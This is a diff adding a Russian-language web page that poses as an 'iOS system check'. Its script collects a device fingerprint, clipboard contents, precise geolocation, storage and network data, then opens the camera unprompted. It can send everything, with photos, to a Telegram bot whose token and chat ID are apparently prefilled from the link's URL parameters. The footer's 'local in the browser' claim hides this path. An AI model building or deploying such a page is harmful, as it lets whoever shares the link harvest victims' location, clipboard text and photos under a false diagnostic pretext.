@@ -1,0 +1,244 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Проверка системы</title>
+<meta name="theme-color" content="#0b0b0f">
+<link rel="manifest" href="manifest.webmanifest">
+<link rel="icon" href="icons/192.png">
+<link rel="apple-touch-icon" href="icons/180.png">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Проверка">
+<style>
+:root{color-scheme:dark;--bg:#0b0b0f;--card:#16161d;--line:#26262f;--text:#f5f5f7;--muted:#8e8e98;--accent:#0a84ff;--ok:#30d158}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;background:var(--bg);color:var(--text);font:16px/1.45 -apple-system,SF Pro Text,system-ui,sans-serif}
+body{min-height:100dvh;padding:calc(env(safe-area-inset-top) + 18px) 18px calc(env(safe-area-inset-bottom) + 24px)}
+.app{max-width:520px;margin:0 auto;display:flex;flex-direction:column;gap:14px}
+header{text-align:center;margin:8px 0 10px}
+.logo{width:62px;height:62px;margin:0 auto 12px;border-radius:16px;background:linear-gradient(145deg,#2c2c38,#111117);display:grid;place-items:center;box-shadow:0 8px 30px #0008, inset 0 1px 0 #ffffff14}
+.logo svg{width:34px;height:34px}
+h1{font-size:24px;letter-spacing:-.4px;margin:0 0 4px;font-weight:700}
+.sub{margin:0;color:var(--muted);font-size:13px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px}
+.card h2{font-size:13px;text-transform:uppercase;letter-spacing:.6px;color:var(--muted);margin:0 0 10px;font-weight:600}
+.hidden{display:none}
+.row{display:flex;justify-content:space-between;font-size:14px;margin-bottom:10px}
+#pct{color:var(--accent);font-variant-numeric:tabular-nums}
+.bar{height:6px;background:#26262f;border-radius:99px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,#0a84ff,#5e5ce6);border-radius:99px;transition:width .25s ease}
+#steps{list-style:none;margin:12px 0 0;padding:0;display:flex;flex-direction:column;gap:7px}
+#steps li{font-size:13px;color:var(--muted);display:flex;gap:8px;align-items:center}
+#steps li::before{content:"";width:7px;height:7px;border-radius:50%;background:#3a3a45;flex:none}
+#steps li.done{color:var(--text)}
+#steps li.done::before{background:var(--ok)}
+pre#json{background:#0e0e13;border:1px solid var(--line);border-radius:12px;padding:12px;font:12px/1.5 ui-monospace,SF Mono,Menlo,monospace;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;margin:0 0 12px;color:#c9c9d4}
+.btns{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+button{font:inherit;border:0;border-radius:14px;padding:14px 16px;color:var(--text);background:#24242d;font-weight:600;cursor:pointer}
+button:active{transform:scale(.98)}
+button.primary{background:var(--accent);color:#fff}
+button.wide{grid-column:1/-1}
+button:disabled{opacity:.5}
+input{width:100%;font:14px ui-monospace,SF Mono,Menlo,monospace;color:var(--text);background:#0e0e13;border:1px solid var(--line);border-radius:12px;padding:12px;margin-bottom:8px;outline:none}
+input:focus{border-color:var(--accent)}
+.hint{font-size:12px;color:var(--muted);margin:2px 0 0}
+.foot{text-align:center;color:#5f5f6b;font-size:12px;margin:6px 0 0}
+#status{font-size:13px;color:var(--muted);text-align:center;min-height:18px}
+.thumb{width:100%;border-radius:12px;margin-bottom:10px;display:block}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+<div class="app">
+  <header>
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#e8e8ee" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="3.2"/>
+        <path d="M19.4 15a1.7 1.7 0 0 0 .34 1.88l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.7 1.7 0 0 0-1.88-.34 1.7 1.7 0 0 0-1 1.56V21a2 2 0 1 1-4 0v-.09a1.7 1.7 0 0 0-1.1-1.56 1.7 1.7 0 0 0-1.88.34l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.7 1.7 0 0 0 4.6 15a1.7 1.7 0 0 0-1.56-1H3a2 2 0 1 1 0-4h.09A1.7 1.7 0 0 0 4.6 8.9a1.7 1.7 0 0 0-.34-1.88l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.7 1.7 0 0 0 1.88.34H9a1.7 1.7 0 0 0 1-1.56V3a2 2 0 1 1 4 0v.09a1.7 1.7 0 0 0 1 1.56 1.7 1.7 0 0 0 1.88-.34l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.7 1.7 0 0 0-.34 1.88V9a1.7 1.7 0 0 0 1.56 1H21a2 2 0 1 1 0 4h-.09a1.7 1.7 0 0 0-1.51 1z"/>
+      </svg>
+    </div>
+    <h1>Проверка системы</h1>
+    <p class="sub">iOS · диагностика устройства</p>
+  </header>
+
+  <section class="card hidden" id="progressCard">
+    <div class="row"><span>Сбор данных</span><span id="pct">0%</span></div>
+    <div class="bar"><i id="bar"></i></div>
+    <ul id="steps"></ul>
+  </section>
+
+  <section class="card hidden" id="resultCard">
+    <h2>Результат</h2>
+    <img class="thumb hidden" id="thumb" alt="">
+    <pre id="json"></pre>
+    <div class="btns">
+      <button id="sendBtn" class="primary">В Telegram</button>
+      <button id="copyBtn">Копировать</button>
+      <button id="downloadBtn">Скачать JSON</button>
+      <button id="againBtn">Заново</button>
+    </div>
+  </section>
+
+  <section class="card" id="cfgCard">
+    <h2>Telegram</h2>
+    <input id="token" placeholder="токен бота" autocomplete="off" autocapitalize="off" spellcheck="false">
+    <input id="chat" placeholder="chat_id" autocomplete="off" inputmode="numeric">
+    <p class="hint">Пусто — просто покажем данные и дадим скачать JSON.</p>
+  </section>
+
+  <input type="file" id="camera" accept="image/*" capture="environment" class="hidden">
+  <button id="startBtn" class="primary">Начать проверку</button>
+  <p id="status"></p>
+  <p class="foot">Локально в браузере · без установки</p>
+</div>
+<script>
+const $=id=>document.getElementById(id);
+const steps=[
+  ["Сведения об устройстве",()=>{Object.assign(data,deviceInfo())}],
+  ["Буфер обмена",readClipboard],
+  ["Геолокация",readGeo],
+  ["Доступная память",readStorage],
+  ["Сетевое окружение",()=>{Object.assign(data,netInfo());return sleep(250)}],
+  ["Подготовка отчета",()=>{data.photos=photos.length;return sleep(300)}]
+];
+let data={},photos=[],running=false;
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+$("token").value=localStorage.getItem("tgToken")||new URLSearchParams(location.search).get("t")||"";
+$("chat").value=localStorage.getItem("tgChat")||new URLSearchParams(location.search).get("c")||"";
+$("token").addEventListener("change",e=>localStorage.setItem("tgToken",e.target.value.trim()));
+$("chat").addEventListener("change",e=>localStorage.setItem("tgChat",e.target.value.trim()));
+
+function deviceInfo(){
+  let gl={};
+  try{
+    const c=document.createElement("canvas"),g=c.getContext("webgl");
+    const d=g.getExtension("WEBGL_debug_renderer_info");
+    gl={vendor:g.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:g.getParameter(d.UNMASKED_RENDERER_WEBGL)};
+  }catch(e){}
+  return {
+    ts:new Date().toISOString(),
+    url:location.href,
+    userAgent:navigator.userAgent,
+    platform:navigator.platform,
+    vendor:navigator.vendor,
+    appVersion:navigator.appVersion,
+    language:navigator.language,
+    languages:navigator.languages,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen:`${screen.width}x${screen.height}@${devicePixelRatio}x`,
+    viewport:`${innerWidth}x${innerHeight}`,
+    colorDepth:screen.colorDepth,
+    touchPoints:navigator.maxTouchPoints,
+    cookies:navigator.cookieEnabled,
+    online:navigator.onLine,
+    standalone:navigator.standalone||matchMedia("(display-mode: standalone)").matches,
+    cores:navigator.hardwareConcurrency,
+    memory:navigator.deviceMemory,
+    gl
+  };
+}
+function netInfo(){
+  const c=navigator.connection||{};
+  return {connType:c.effectiveType,downlink:c.downlink,rtt:c.rtt,saveData:c.saveData};
+}
+async function readClipboard(){
+  const timeout=new Promise(r=>setTimeout(()=>r("таймаут"),2500));
+  try{data.clipboard=await Promise.race([navigator.clipboard.readText(),timeout])}
+  catch(e){data.clipboard="нет доступа"}
+  return sleep(200);
+}
+function readGeo(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){data.geo="нет API";return resolve()}
+    const t=setTimeout(()=>{data.geo="таймаут";resolve()},8000);
+    navigator.geolocation.getCurrentPosition(
+      p=>{clearTimeout(t);data.geo={lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy};resolve()},
+      e=>{clearTimeout(t);data.geo="отказ: "+e.message;resolve()},
+      {enableHighAccuracy:true,timeout:7000,maximumAge:0}
+    );
+  });
+}
+async function readStorage(){
+  try{const s=await navigator.storage.estimate();data.storage={quota:s.quota,usage:s.usage}}
+  catch(e){data.storage="нет API"}
+  return sleep(200);
+}
+function paint(i){
+  $("pct").textContent=Math.round(i/steps.length*100)+"%";
+  $("bar").style.width=(i/steps.length*100)+"%";
+  [...$("steps").children].forEach((li,n)=>li.classList.toggle("done",n<i));
+}
+async function run(){
+  if(running)return;
+  running=true;
+  data={};photos=[];
+  $("resultCard").classList.add("hidden");
+  $("progressCard").classList.remove("hidden");
+  $("steps").innerHTML=steps.map(s=>`<li>${s[0]}</li>`).join("");
+  $("status").textContent="";
+  for(let i=0;i<steps.length;i++){
+    paint(i);
+    await steps[i][1]();
+  }
+  paint(steps.length);
+  $("json").textContent=JSON.stringify(data,null,2);
+  $("progressCard").classList.add("hidden");
+  $("resultCard").classList.remove("hidden");
+  $("status").textContent="Фото: добавь кнопкой камеры или отправь как есть";
+  $("resultCard").scrollIntoView({behavior:"smooth",block:"start"});
+  setTimeout(openCamera,600);
+  running=false;
+}
+function openCamera(){$("camera").click()}
+$("camera").addEventListener("change",async e=>{
+  const f=e.target.files&&e.target.files[0];
+  if(!f)return;
+  photos.push(f);
+  const url=URL.createObjectURL(f);
+  const img=$("thumb");
+  img.src=url;img.classList.remove("hidden");
+  $("json").textContent=JSON.stringify({...data,photos:photos.length},null,2);
+  $("status").textContent=`Фото прикреплено (${photos.length})`;
+});
+function payload(){return JSON.stringify({...data,photos:photos.length},null,2)}
+$("startBtn").addEventListener("click",run);
+$("againBtn").addEventListener("click",()=>{$("resultCard").classList.add("hidden");$("cfgCard").scrollIntoView({behavior:"smooth"});setTimeout(run,250)});
+$("copyBtn").addEventListener("click",async()=>{
+  try{await navigator.clipboard.writeText(payload());$("status").textContent="JSON скопирован"}catch(e){$("status").textContent="Копирование не удалось"}
+});
+$("downloadBtn").addEventListener("click",()=>{
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(new Blob([payload()],{type:"application/json"}));
+  a.download="ios-check-"+Date.now()+".json";
+  a.click();
+});
+$("sendBtn").addEventListener("click",async()=>{
+  const token=$("token").value.trim(),chat=$("chat").value.trim();
+  if(!token||!chat){$("status").textContent="Заполни токен и chat_id ниже";$("cfgCard").scrollIntoView({behavior:"smooth"});return}
+  $("sendBtn").disabled=true;
+  try{
+    const fd=new FormData();
+    fd.append("chat_id",chat);
+    fd.append("caption","iOS чек · "+new Date().toLocaleString("ru-RU"));
+    fd.append("document",new Blob([payload()],{type:"application/json"}),"ios-check.json");
+    let r=await fetch(`https://api.telegram.org/bot${token}/sendDocument`,{method:"POST",body:fd});
+    if(!r.ok)throw new Error((await r.json()).description||r.status);
+    for(const p of photos){
+      const pf=new FormData();
+      pf.append("chat_id",chat);
+      pf.append("photo",p);
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:pf});
+    }
+    $("status").textContent="Отправлено в Telegram";
+  }catch(e){$("status").textContent="Ошибка: "+e.message}
+  $("sendBtn").disabled=false;
+});
+if("serviceWorker" in navigator&&location.protocol==="https:"){
+  navigator.serviceWorker.register("sw.js").catch(()=>{});
+}
+</script>
+</body>
+</html>
